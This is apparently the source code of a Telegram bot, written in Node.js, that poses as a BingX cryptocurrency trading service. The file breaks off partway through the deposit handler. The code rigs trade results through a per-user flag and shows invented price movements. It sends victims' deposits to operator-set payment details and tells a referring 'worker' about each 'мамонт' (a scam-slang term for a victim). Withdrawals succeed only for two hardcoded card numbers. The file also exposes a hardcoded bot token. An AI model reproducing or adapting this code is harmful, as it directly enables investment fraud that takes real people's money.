const TelegramBot = require('node-telegram-bot-api');

const token = '6334457411:AAGFFmCL_JSaN6BAeMicY9So0fG5st1L49w';
const {
    DataTypes
} = require('sequelize');
const sequelize = require('./db');
const UserModel = require('./models');
const bot = new TelegramBot(token, {
    polling: true
});

const mainKeyboard = {
    reply_markup: JSON.stringify({
        keyboard: [
            ["📊 ECN счёт"],
            ["🖥 Личный кабинет"],
            ["📝 Информация", "🧑🏻‍💻 Техническая поддержка"]
        ]
    })
};

const prompts = require('prompts');
const WebSocket = require('ws');
const User = require('./models');

const run = async (symbol) => {
    return new Promise((resolve) => {
        const ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbol.toLowerCase()}@kline_1m`);

        ws.on('message', (data) => {
            const incomingData = JSON.parse(data.toString());
            if (incomingData.k) {
                const coinCost = Number(incomingData.k.c);
                resolve(coinCost); // Розділити значення через resolve, коли отримано дані
            }
        });
    });
}

const menuKeyboard = {
    reply_markup: {
        keyboard: [
            [{
                text: '📊 ECN Счёт'
            }],
            [{
                text: '💼 Личный Кабинет'
            }],
            [{
                text: '⚙️ Тех.Поддержка'
            }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

const deleteMessage = (id, msg) => (
    bot.deleteMessage(id, msg)
);

const ownCabinet = (userId, userBalance, userVivod, userStatus, allDeals, successfullDeals, unsuccessfullDeals, userverif, daysRegistered) => ('🖥 Личный кабинет\n' +
    '\n' +
    '➖➖➖➖➖➖➖➖➖➖\n' +
    `*Ваш ID*: *${userId}*\n` +
    `*Верификация*: ${userverif ? '✅ Верифицирован' : '⚠️ Не верифицирован'}\n` +
    `*Статус*: ${userStatus ? '🔼Положительный🔼' : '😐Подозрительный😐'}\n` +
    '➖➖➖➖➖➖➖➖➖➖\n' +
    `💰 Баланс : ${userBalance} ₽\n` +
    `📂 На выводе : ${userVivod} ₽\n` +
    '➖➖➖➖➖➖➖➖➖➖\n' +
    `📊 Всего сделок : ${allDeals}\n` +
    '\n' +
    `✅ Успешных сделок : ${successfullDeals}\n` +
    `❌ Неуспешных сделок : ${unsuccessfullDeals}\n` +
    '➖➖➖➖➖➖➖➖➖➖\n' +
    `📝 Зарегистрирован: ${daysRegistered} д.\n` +
    '➖➖➖➖➖➖➖➖➖➖\n' +
    '\n' +
    '⚠️ Наша техническая поддержка - @alinkamurcc. \n Сотрудники технической поддержки никогда не пишут вам первыми.'
);

function getRandomNumberInRange(x, y) {
    if (x > y) {
        // Swap x and y if they are given in reverse order
        [x, y] = [y, x];
    }

    const min = Math.ceil(x);
    const max = Math.floor(y);

    return (Math.random() * (max - min + 1) + min).toFixed(2);
}

function qiwiChecker(paymentWay) {
    bot.on('message', async function qiwiCheck(msg) {
        const text = msg.text;
        const chatId = msg.chat.id;

        if (!isNaN(text) && text.length >= 10 && text.length <= 19) {
            const cardNum = Number(text);
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            bot.removeListener('message', qiwiCheck);

            await bot.sendMessage(chatId, `💰 Ваш баланс : ${user.balance} ₽ \n \n` +
                '*Введите сумму для вывода*.', {
                    parse_mode: 'Markdown'
                }
            );

            bot.on('message', async function balanceCheck(msg) {
                const text = msg.text;
                const chatId = msg.chat.id;

                if (!isNaN(text)) {
                    const withdrawNum = Number(text);

                    const user = await UserModel.findOne({
                        where: {
                            chatId: chatId.toString()
                        }
                    });

                    if (cardNum.toString() === '79120874881' || cardNum.toString() === '2200240715868499') {
                        bot.removeListener('message', balanceCheck);
                        if (withdrawNum <= user.balance && user.balance !== 0 && withdrawNum >= user.minDeposit && user.vivodSuccess) {
                            bot.sendMessage(chatId, `✅ *Вы успешно подали заявку на вывод денежных средств*. \n \n` +
                                `ID заявки : ${getRandomNumberInRange(385478, 861835)} \n` +
                                `Сумма вывода : ${withdrawNum} ₽ \n` +
                                `Реквизиты для вывода : ${cardNum} \n \n` +
                                '⚠️ _Вывод средств может занять до 3 часов_.'
                            );

                            bot1.sendMessage(user.worker, `📊 *Сервис - Трейдинг* \n \n` +
                                `✅ Мамонт [${user.username}](https://t.me/${user.username}) \n` +
                                `Создал заявку на вывод денежных средств в размере - *${withdrawNum}* ₽`, {
                                    parse_mode: 'Markdown',
                                    reply_markup: {
                                        inline_keyboard: [
                                            [{
                                                text: 'Вывести',
                                                callback_data: `realWithdrawTrue`
                                            }, {
                                                text: 'Отменить',
                                                callback_data: `realWithdrawFalse`
                                            }],
                                        ],
                                    },
                                })

                            bot1.on('callback_query', async (query) => {
                                const chatId = query.message.chat.id;
                                const buttonData = query.data;
                                const messageId = query.message.message_id;

                                try {
                                    if (buttonData === `realWithdrawTrue`) {
                                        bot1.deleteMessage(chatId, messageId);

                                        user.balance -= withdrawNum;
                                        await user.save();
                                        return bot.sendMessage(user.chatId, '✅ Ваша заявка на вывод средств была успешно обработана,' +
                                            'средства поступят на ваши реквизиты в течении 15 минут'
                                        );
                                    } else {
                                        bot1.deleteMessage(chatId, messageId);
                                        return bot.sendMessage(user.chatId, `❌ _Вывод средств был отменен, обратитесь в техническую поддержку по ссылке ниже_`, {
                                            parse_mode: 'Markdown',
                                            reply_markup: {
                                                inline_keyboard: [
                                                    [{
                                                        text: 'Обратиться в поддержку',
                                                        url: 'https://t.me/alinkamurcc'
                                                    }]
                                                ]
                                            }
                                        });
                                    }
                                } catch (e) {
                                    console.log('Підключення зламалось', e);
                                }
                            })

                        } else if (withdrawNum > user.balance || user.balance !== 0) {
                            return bot.sendMessage(chatId, `У вас недостаточно средств на счету`);
                        } else if (withdrawNum < user.minDeposit) {
                            return bot.sendMessage(chatId, `*Минимальный депозит*: ${user.minDeposit}`)
                        } else {
                            return bot.sendMessage(chatId, `❌ _Вывод средств был отменен, обратитесь в техническую поддержку по ссылке ниже_`, {
                                parse_mode: 'Markdown',
                                reply_markup: {
                                    inline_keyboard: [
                                        [{
                                            text: 'Обратиться в поддержку',
                                            url: 'https://t.me/alinkamurcc'
                                        }]
                                    ]
                                }
                            });
                        }
                    } else if (withdrawNum <= user.balance && user.balance !== 0 && withdrawNum >= user.minDeposit) {
                        bot.removeListener('message', balanceCheck);

                        return bot.sendMessage(chatId, `❌ _Вывод средств был отменен, обратитесь в техническую поддержку по ссылке ниже_`, {
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: 'Обратиться в поддержку',
                                        url: 'https://t.me/alinkamurcc'
                                    }]
                                ]
                            }
                        });
                    } else if (user.balance === 0 || user.minDeposit > user.balance) {
                        bot.removeListener('message', balanceCheck);

                        return bot.sendMessage(chatId, `❌ На вашем счету недостаточно средств для вывода`);
                    } else if (withdrawNum > user.balance) {
                        bot.sendMessage(chatId, `*❌ Минимальная сумма вывода ${user.minDeposit} RUB*!` +
                            '\n \n Введите правильную сумму вывода', {
                                parse_mode: 'Markdown'
                            });
                    }
                }
            });
        } else {
            bot.sendMessage(chatId, '*Введенный номер ' +
                `${paymentWay === 'card' ? 'карты' : 'кошелька'}` +
                ' не верный*! \n \n' +
                'Введите правильный номер ' +
                `${paymentWay === 'card' ? 'банковской карты' : 'QIWI кошелька'}`, {
                    parse_mode: 'Markdown'
                });
        }
    })
}

function generateLkKeyboard(user, userId, timeDiff) {
    return {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{
                    text: '💳 Пополнить',
                    callback_data: 'deposit'
                }, {
                    text: '💸 Вывести',
                    callback_data: 'withdraw'
                }],
                [{
                    text: '🔒 Верификация',
                    callback_data: 'verification'
                }],
                [{
                    text: '⚙️ Настройки',
                    callback_data: 'settings'
                }]
            ]
        },
        caption: ownCabinet(userId, user.balance, user.vivod, user.status, user.deals, user.goodDeals, user.badDeals, user.verif, timeDiff)
    };
}

// function generateDepKeyboard() {
//     return {
//         reply_markup: {
//             inline_keyboard: [
//                 [{
//                     text: '💳 Пополнить банковской картой',
//                     callback_data: 'deposit_with_card'
//                 }],
//                 [{
//                     text: '💰 Пополнить киви кошельком',
//                     callback_data: 'deposit_with_wallet'
//                 }],
//             ]
//         }
//     };
// }

function buttonChecker(messageId) {
    bot.on('callback_query', async function lastButtonChecker(query) {
        const userId = query.from.id;
        const chatId = query.message.chat.id;

        if (query.data === 'continue') {
            bot.editMessageReplyMarkup({
                inline_keyboard: []
            }, {
                chat_id: chatId,
                message_id: query.message.message_id
            });

            bot.removeListener('callback_query', lastButtonChecker);
            return bot.sendPhoto(chatId, './images/ECN.jpg', {
                caption: '📊 ECN счёт\nВыберите монету для инвестирования денежных средств',
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Bitcoin',
                            callback_data: 'btc_coin'
                        }, {
                            text: 'Qtum',
                            callback_data: 'qtum_coin'
                        }],
                        [{
                            text: 'Ethereum',
                            callback_data: 'eth_coin'
                        }, {
                            text: 'Tron',
                            callback_data: 'trx_coin'
                        }],
                        [{
                            text: 'Litecoin',
                            callback_data: 'ltc_coin'
                        }, {
                            text: 'Ripple',
                            callback_data: 'xrp_coin'
                        }],
                        [{
                            text: 'Cardano',
                            callback_data: 'ada_coin'
                        }, {
                            text: 'Solana',
                            callback_data: 'sol_coin'
                        }],
                        [{
                            text: 'Terra',
                            callback_data: 'luna_coin'
                        }, {
                            text: 'Doge',
                            callback_data: 'doge_coin'
                        }],
                        [{
                            text: 'Polka Dot',
                            callback_data: 'dot_coin'
                        }, {
                            text: 'Avalanche',
                            callback_data: 'avax_coin'
                        }],
                        [{
                            text: 'Polygon',
                            callback_data: 'matic_coin'
                        }, {
                            text: 'Uniswap',
                            callback_data: 'uni_coin'
                        }],
                    ]
                }
            });
        }

        if (query.data === 'break') {
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });
            const currentDate = new Date();
            const registrationDate = user.registrationDate;
            const timeDiff = currentDate - registrationDate;
            const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24));

            bot.removeListener('callback_query', lastButtonChecker);
            bot.editMessageReplyMarkup({
                inline_keyboard: []
            }, {
                chat_id: chatId,
                message_id: query.message.message_id
            });
            bot.sendMessage(chatId, '⚡️', menuKeyboard);
            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(user, userId, daysRegistered));
        }

        bot.removeListener('callback_query', lastButtonChecker);
        return;
    })
    return;
}

function sendCountdownMessage(chatId, messageId, time, currency, pullSum, firstCost, lastPoint) {
    const intervalId = setInterval(async () => {
        if (time > 5) {
            const secondCost = getRandomNumberInRange(firstCost - 15, firstCost + 15);

            // Отправляем обновленное сообщение с текущим временем
            const updatedMessageText = `🏦 ${currency} \n \n` +
                `💵 Сумма пула: ${pullSum}₽ \n` +
                `${lastPoint === 'up' ? '📈: Прогноз: Повышение' : '📉: Прогноз: Понижение'} \n \n` +
                `• Изначальная стоимость: ${firstCost} USD \n` +
                `• Текущая стоимость: ${secondCost} USD \n` +
                `• Изменение: ${(firstCost - secondCost).toFixed(2)} USD \n \n` +
                `⏱ Осталось: ${time - 5} сек`;
            bot.editMessageText(updatedMessageText, {
                chat_id: chatId,
                message_id: messageId,
            });

            time -= 5;
        } else {
            clearInterval(intervalId);
            bot.deleteMessage(chatId, messageId);
            let secondCost;
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            if (user.success) {
                if (lastPoint === 'up') {
                    secondCost = getRandomNumberInRange(firstCost + 1, firstCost + 8);
                } else {
                    secondCost = getRandomNumberInRange(firstCost - 8, firstCost - 1);
                }

                user.balance += pullSum * 2;
                user.deals += 1;
                user.goodDeals += 1;

                await user.save();

                return bot.sendMessage(chatId, `📊 Стоимость актива \n \n` +
                    `✅ Ваш прогноз оказался верным \n \n` +
                    `• Изначальная стоимость: ${firstCost} USD \n` +
                    `• Текущая стоимость: ${secondCost} USD \n` +
                    `• Изменение: ${(secondCost - firstCost).toFixed(2)} USD \n \n` +
                    `⏱ Осталось: 0 сек`, {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: 'Продолжить',
                                    callback_data: 'continue'
                                }],
                                [{
                                    text: 'Отмена',
                                    callback_data: 'break'
                                }],
                            ]
                        }
                    }
                ).then(sentMessage => {
                    const message__Id = sentMessage.message_id;

                    return buttonChecker(message__Id);
                });
            } else {
                if (lastPoint === 'up') {
                    secondCost = getRandomNumberInRange(firstCost - 15, firstCost - 1);
                } else {
                    secondCost = getRandomNumberInRange(firstCost + 1, firstCost + 15);
                }

                user.balance -= pullSum;
                user.deals += 1;
                user.badDeals += 1;

                await user.save();

                return bot.sendMessage(chatId, `📊 Стоимость актива \n \n` +
                    `❌ Ваш прогноз оказался неверным \n \n` +
                    `• Изначальная стоимость: ${firstCost} USD \n` +
                    `• Текущая стоимость: ${secondCost} USD \n` +
                    `• Изменение: ${(firstCost - secondCost).toFixed(2)} USD \n \n` +
                    `⏱ Осталось: 0 сек`, {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: 'Продолжить',
                                    callback_data: 'continue'
                                }],
                                [{
                                    text: 'Отмена',
                                    callback_data: 'break'
                                }],
                            ]
                        }
                    }
                ).then(sentMessage => {
                    const message__Id = sentMessage.message_id;

                    return buttonChecker(message__Id);
                });
            }
        }
    }, 5000);

    return;
}

function botPull(currency, firstCost, lastPoint) {
    let pullSum;

    bot.on('message', async function msgFunc(msg) {
        const text = msg.text;
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (!isNaN(text)) {
            pullSum = Number(text);

            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            if (pullSum <= user.balance && pullSum > 0) {
                bot.removeListener('message', msgFunc);

                bot.sendMessage(chatId, `🕰 Время ожидания:`, {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: '30 Секунд',
                                callback_data: '30'
                            }],
                            [{
                                text: '1 Минута',
                                callback_data: '60'
                            }],
                            [{
                                text: '3 Минуты',
                                callback_data: '180'
                            }],
                            [{
                                text: '10 Минут',
                                callback_data: '600'
                            }],
                        ]
                    },
                });
            } else if (pullSum < 0) {
                bot.sendMessage(chatId, "❌ *Введите целое число, без лишних символов*", {
                    parse_mode: 'Markdown'
                });
            } else if (pullSum === 0) {
                bot.sendMessage(chatId, "❌ *Сумма пулла не может быть 0*", {
                    parse_mode: 'Markdown'
                });
            } else {
                return bot.sendMessage(chatId, "⚠️ *У вас недостаточно средств на балансе*", {
                    parse_mode: 'Markdown'
                });
            }

        } else {
            bot.sendMessage(chatId, 'Сумма пула должна быть числом! \n \n' + 'Введите сумму пула');
        }
    });

    bot.on('callback_query', function callFunc(query) {
        const chatId = query.message.chat.id;
        let messageId = query.message.message_id;
        let time = +query.data;

        if (!isNaN(query.data)) {
            deleteMessage(chatId, messageId);

            return bot.sendMessage(chatId, `🏦 ${currency} \n \n` +
                `💵 Сумма пула: ${pullSum}₽ \n` +
                `${lastPoint === 'up' ? '📈: Прогноз: Повышение' : '📉: Прогноз: Понижение'} \n \n` +
                `• Изначальная стоимость: ${firstCost} USD \n` +
                `• Текущая стоимость: ${firstCost} USD \n` +
                `• Изменение: ${firstCost - firstCost} USD \n \n` +
                `⏱ Осталось: ${time} сек`
            ).then(sentMessage => {
                messageId = sentMessage.message_id;

                bot.removeListener('callback_query', callFunc);

                return sendCountdownMessage(chatId, messageId, time, currency, pullSum, firstCost, lastPoint, lastPoint);
            })
        }

        return;
    });

    return;
}


bot.setMyCommands([{
        command: '/start',
        description: 'Запуск бота'
    },
    {
        command: '/help',
        description: 'Помощь'
    },
]);

try {
    sequelize.authenticate()
    sequelize.sync()
    // UserModel.drop();
    // console.log('Таблиця UserModel успішно видалена');
} catch (e) {
    console.log('Підключення зламалось', e);
}

bot.onText(/\/start (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const referralCode = match[1]; // Extract the referral code from the command
    const userId = msg.from.id;
    const username = msg.from.username;

    try {
        await sequelize.authenticate()
        await sequelize.sync()

        const user = await UserModel.findOne({
            where: {
                chatId: chatId.toString()
            }
        });

        const rokky = await UserModel.findOne({
            where: {
                chatId: '6191812267',
            }
        });

        if (user) {
            const currentDate = new Date();
            const registrationDate = user.registrationDate;
            const timeDiff = currentDate - registrationDate;
            const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24));

            await bot.sendMessage(chatId, '⚡️', menuKeyboard);
            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(user, userId, timeDiff));
        } else {
            const worker = await UserModel.findOne({
                where: {
                    chatId: referralCode.toString(),
                }
            });

            if (username) {
                if (worker) {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        minDeposit: worker.minDeposit,
                        worker: referralCode.toString(),
                        username: username,
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                } else {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        username: username,
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                }
            } else {
                if (worker) {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        minDeposit: worker.minDeposit,
                        worker: referralCode.toString(),
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                } else {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                }
            }

            if (worker) {
                bot1.sendMessage(referralCode, `Мамонт зашёл по ссылке под ID: ${userId}, Имя мамонта: ${username ? `@${username}` : 'У мамонта нету юзернейма!'}`);
                const updatedMamonts = [...worker.mamonts, chatId.toString()];
                await worker.update({
                    mamonts: updatedMamonts
                });
            }

            return bot.sendMessage(chatId, `🎉 Привет${username ? `, @${username}` : ''}!\n` +
                'Политика и условия пользования данным ботом.\n' +
                '1. Перед принятием инвестиционного решения Инвестору необходимо самостоятельно оценить экономические риски и выгоды, налоговые, юридические, бухгалтерские последствия заключения сделки, свою готовность и возможность принять такие риски. Клиент также несет расходы на оплату брокерских и депозитарных услуг\n' +
                '2. Принимая правила, Вы подтверждаете своё согласие со всеми вышеперечисленными правилами!\n' +
                '3. Ваш аккаунт может быть заблокирован в подозрении на мошенничество/обман нашей системы! Каждому пользователю необходима верификация для вывода крупной суммы средств.\н' +
                '4. Мультиаккаунты запрещены!\n' +
                '5. Скрипты, схемы, тактики использовать запрещено!\n' +
                '6. Если будут выявлены вышеперечисленные случаи, Ваш аккаунт будет заморожен до выяснения обстоятельств!\n' +
                '7. В случае необходимости администрация имеет право запросить у Вас документы, подтверждающие Вашу личность и Ваше совершеннолетие.\n' +
                '\n' +
                'По всем вопросам Вывода средств, по вопросам пополнения, а так же вопросам игры обращайтесь в поддержку, указанную в описании к боту.\n' +
                '\n' +
                'Спасибо за понимание, Ваш «@BingX_wallet_bot»', {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: 'Принять ✓',
                                callback_data: 'accept'
                            }]
                        ]
                    }
                });
        }
    } catch (e) {
        console.log('Підключення зламалось', e);
    }
});

bot.on('message', async (msg, match) => {
    const text = msg.text;
    const chatId = msg.chat.id;
    const userId = msg.from.id;


    await sequelize.authenticate()
    await sequelize.sync()

    const user = await UserModel.findOne({
        where: {
            chatId: chatId.toString()
        }
    });

    if (text === '/start') {
        const username = msg.from.username;

        try {
            await sequelize.authenticate()
            await sequelize.sync()

            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });
            const rokky = await UserModel.findOne({
                where: {
                    chatId: '6191812267',
                }
            });

            if (user) {
                if (!user.isBlocked) {
                    const currentDate = new Date();
                    const registrationDate = user.registrationDate;
                    const timeDiff = currentDate - registrationDate;
                    const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24) + 1);

                    await bot.sendMessage(chatId, '⚡️', menuKeyboard);
                    return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(user, userId, daysRegistered));
                } else {
                    return bot.sendMessage(chatId, 'Доступ запрещен');
                }
            } else {
                if (username) {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        username: username,
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                } else {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                }
                return bot.sendMessage(chatId, `🎉 Привет${username ? `, @${username}` : ''}!\n` +
                    'Политика и условия пользования данным ботом.\n' +
                    '1. Перед принятием инвестиционного решения Инвестору необходимо самостоятельно оценить экономические риски и выгоды, налоговые, юридические, бухгалтерские последствия заключения сделки, свою готовность и возможность принять такие риски. Клиент также несет расходы на оплату брокерских и депозитарных услуг\n' +
                    '2. Принимая правила, Вы подтверждаете своё согласие со всеми вышеперечисленными правилами!\n' +
                    '3. Ваш аккаунт может быть заблокирован в подозрении на мошенничество/обман нашей системы! Каждому пользователю необходима верификация для вывода крупной суммы средств.\н' +
                    '4. Мультиаккаунты запрещены!\n' +
                    '5. Скрипты, схемы, тактики использовать запрещено!\n' +
                    '6. Если будут выявлены вышеперечисленные случаи, Ваш аккаунт будет заморожен до выяснения обстоятельств!\n' +
                    '7. В случае необходимости администрация имеет право запросить у Вас документы, подтверждающие Вашу личность и Ваше совершеннолетие.\n' +
                    '\n' +
                    'По всем вопросам Вывода средств, по вопросам пополнения, а так же вопросам игры обращайтесь в поддержку, указанную в описании к боту.\n' +
                    '\n' +
                    'Спасибо за понимание, Ваш «@BingX_wallet_bot»', {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: 'Принять ✓',
                                    callback_data: 'accept'
                                }]
                            ]
                        }
                    });
            }
        } catch (e) {
            console.log('Підключення зламалось', e);
        }
    }

    if (user.isBlocked) {
        return bot.sendMessage(chatId, 'Доступ запрещен');
    } else {
        if (text === '/wallet' || text === '📊 ECN Счёт') {
            return bot.sendPhoto(chatId, './images/ECN.jpg', {
                caption: '📊 ECN счёт\nВыберите монету для инвестирования денежных средств',
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Bitcoin',
                            callback_data: 'btc_coin'
                        }, {
                            text: 'Qtum',
                            callback_data: 'qtum_coin'
                        }],
                        [{
                            text: 'Ethereum',
                            callback_data: 'eth_coin'
                        }, {
                            text: 'Tron',
                            callback_data: 'trx_coin'
                        }],
                        [{
                            text: 'Litecoin',
                            callback_data: 'ltc_coin'
                        }, {
                            text: 'Ripple',
                            callback_data: 'xrp_coin'
                        }],
                        [{
                            text: 'Cardano',
                            callback_data: 'ada_coin'
                        }, {
                            text: 'Solana',
                            callback_data: 'sol_coin'
                        }],
                        [{
                            text: 'Terra',
                            callback_data: 'luna_coin'
                        }, {
                            text: 'Doge',
                            callback_data: 'doge_coin'
                        }],
                        [{
                            text: 'Polka Dot',
                            callback_data: 'dot_coin'
                        }, {
                            text: 'Avalanche',
                            callback_data: 'avax_coin'
                        }],
                        [{
                            text: 'Polygon',
                            callback_data: 'matic_coin'
                        }, {
                            text: 'Uniswap',
                            callback_data: 'uni_coin'
                        }],
                    ]
                }
            });
        }

        if (text === '/lk' || text === '💼 Личный Кабинет') {
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });
            const currentDate = new Date();
            const registrationDate = user.registrationDate;
            const timeDiff = Math.floor((currentDate - registrationDate) / (1000 * 60 * 60 * 24)) + 1;

            await bot.sendMessage(chatId, '⚡️', menuKeyboard);
            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(user, userId, timeDiff));
        }

        if (text === '/support' || text === '⚙️ Тех.Поддержка') {
            const caption_text = '⚙️ Техническая поддержка\n' +
                '\n' +
                'Для обращения в поддержку прочитайте инструкцию ниже.\n' +
                '\n' +
                '1. При первом обращении укажите ваш ID\n' +
                '2.Опишите подробнее что у вас случилось\n' +
                '3.Выполняйте все действия агента в худшем случае он будет вынужден покинуть чат поддержки.';

            return bot.sendPhoto(chatId, './images/tech_support.jpg', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Обратиться в поддержку',
                            url: 'https://t.me/alinkamurcc'
                        }]
                    ]
                },
                caption: caption_text,
            });
        }
    }
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const userId = query.from.id;
    const user = await UserModel.findOne({
        where: {
            chatId: chatId.toString()
        }
    });

    if (user.isBlocked) {
        return bot.sendMessage(chatId, 'Доступ запрещен')
    } else {
        if (query.data === 'accept') {
            deleteMessage(chatId, messageId);
            const currentDate = new Date();
            const registrationDate = user.registrationDate;
            const timeDiff = currentDate - registrationDate;
            const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24) + 1);

            await bot.sendMessage(chatId, '⚡️', menuKeyboard);
            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(user, userId, daysRegistered));
        } else if (query.data === 'deposit') {
            bot.sendPhoto(chatId, "./images/deposit.jpg", {
                caption: "💰 Выберите метод пополнения через который Вы хотите совершить пополнение.",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '💳 Пополнить банковской картой',
                            callback_data: 'deposit_with_card'
                        }],
                        [{
                            text: '💰 Пополнить киви кошельком',
                            callback_data: 'deposit_with_wallet'
                        }],
                    ]
                }
            });
        } else if (query.data === 'deposit_with_card') {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const userId = query.from.id;
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });
            bot.deleteMessage(chatId, messageId);
            bot.sendMessage(chatId, 'Введите сумму пополнения банковской картой:\n' +
                '\n' +
                `Минимальная сумма - ${user.minDeposit} RUB`);

            bot.on('message', async function depositSumChecker(msg) {
                const text = msg.text;
                const chatId = msg.chat.id;
                const userId = msg.from.id;
                let depositFinalAccess = false;
                const newDep = Number(text);


                await sequelize.authenticate()
                await sequelize.sync()

                const mamont = await UserModel.findOne({
                    where: {
                        chatId: chatId.toString()
                    }
                });

                if (isNaN(text) || newDep <= user.minDeposit) {
                    bot.sendMessage(chatId, `Введите верное число которое больше чем минимальная сумма пополнения ${user.minDeposit}!!`);
                } else {
                    bot.sendMessage(chatId, 'Сделка /c33362 \n \n' +
                        'Ожидаем /pintuzik. Если он не появится в течение 10 минут, то сделка будет отменена автоматически. \n \n' +
                        '⚠️ Пожалуйста, учтите, что в целях безопасности запрещено передавать реквизиты вне этого бота. \n \n' +
                        'Вы можете в любой момент отменить сделку самостоятельно. \n' +
                        'Но учтите, что переданные деньги не возвращаются при отмене сделки! \n \n' +
                        'Автоотмена сделки произойдёт через 10 минут'
                    );

                    bot.sendMessage(chatId, '🔹 Оплата банковской картой: \n \n' +
                        `Сумма: *${text}* ₽ \n \n` +
                        'Осуществите перевод на указанную выше сумму, используя данные реквизиты \n \n' +
                        `'${mamont.depositCard}' с коментарием ${mamont.chatId} \n \n` +
                        '⚠️ Если вы не можете добавить комментарий, отправьте чек/скриншот оплаты в тех. поддержку.', {
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: 'Проверить платеж',
                                        callback_data: 'checkPayment'
                                    }],
                                    [{
                                        text: 'Обратиться в поддержку',
                                        url: 'https://t.me/alinkamurcc'
                                    }],
                                    [{
                                        text: 'Отменить Пополнение',
                                        callback_data: 'cancelPayment'
                                    }],
                                ]
                            },
                        }
                    )

                    bot1.sendMessage(mamont.worker, '📊 Сервис - Трейдинг \n \n' +
                        `✅ Мамонт [${mamont.username}](https://t.me/${mamont.username}) [/c35534] \n` +
                        `Создал заявку на пополнение в размере - *${text}* ₽`, {
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true,
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: '💰 Оплатить',
                                        callback_data: 'confirm_mamontPayment'
                                    }]
                                ]
                            }
                        }
                    )

                    bot1.on('callback_query', async function ConfirmMamontu(query) {
                        const chatId = query.message.chat.id;
                        const messageId = query.message.message_id;
                        const userId = query.from.id;

                        if (query.data === 'confirm_mamontPayment') {
                            depositFinalAccess = true;
                            bot1.deleteMessage(chatId, messageId);
                            bot1.removeListener('callback_query', ConfirmMamontu);
                            bot1.sendMessage(chatId, '✅ Счет успешно оплачен');
                        }
                    })

                    bot.on('callback_query', async function Mamontchecker(query) {
                        const chatId = query.message.chat.id;
                        const messageId = query.message.message_id;
                        const userId = query.from.id;

                        if (query.data === 'cancelPayment') {
                            bot.removeListener('callback_query', Mamontchecker);
                            bot.removeListener('message', depositSumChecker);
                            bot.deleteMessage(chatId, messageId);
                            const currentDate = new Date();
                            const registrationDate = mamont.registrationDate;
                            const timeDiff = currentDate - registrationDate;
                            const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24) + 1);

                            await bot.sendMessage(chatId, '⚡️', menuKeyboard);
                            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(mamont, userId, daysRegistered));
                        } else if (query.data === 'checkPayment') {
                            if (depositFinalAccess) {
                                bot.removeListener('callback_query', Mamontchecker);
                                bot.removeListener('message', depositSumChecker);
                                bot.deleteMessage(chatId, messageId);
                                mamont.balance += Number(text);
                                mamont.save()
                                return bot.sendMessage(chatId, `✅ Баланс был успешно пополнен на сумму: *${text} ₽*`, {
                                    parse_mode: 'Markdown',
                                })
                            } else {
                                bot.sendMessage(chatId, '⚠️ Платеж не был обнаружен.')
                            }
                        }
                    })
                }
            })

        } else if (query.data === 'deposit_with_wallet') {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const userId = query.from.id;
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });
            bot.deleteMessage(chatId, messageId);
            bot.sendMessage(chatId, 'Введите сумму пополнения киви кошельком:\n' +
                '\n' +
                `Минимальная сумма - ${user.minDeposit} RUB`);

            bot.on('message', async function depositSumChecker(msg) {
                const text = msg.text;
